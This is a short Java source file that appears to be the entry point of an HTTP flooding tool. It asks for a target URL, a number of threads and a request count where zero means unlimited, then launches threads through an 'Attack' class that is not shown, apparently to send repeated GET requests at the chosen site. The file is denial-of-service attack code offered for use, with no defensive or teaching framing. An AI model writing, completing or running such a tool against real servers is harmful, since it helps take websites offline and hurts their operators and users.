import java.util.Scanner;

public class Main {
    public static Scanner scanner = new Scanner(System.in);
    public static Attack attack = new Attack();

    public static void main(String[] args) {

        System.out.print("Enter URL - (http://domain): ");
        String url = scanner.next();

        System.out.print("Enter number of threads: ");
        int threads = scanner.nextInt();

        System.out.print("Number of requests (0 is infinity): ");
        int times = scanner.nextInt();

        attack.setUrl(url);

        for (int i = 0; i < threads; i++) {
            Attack.sendGetThread(times, url);
        }
    }

}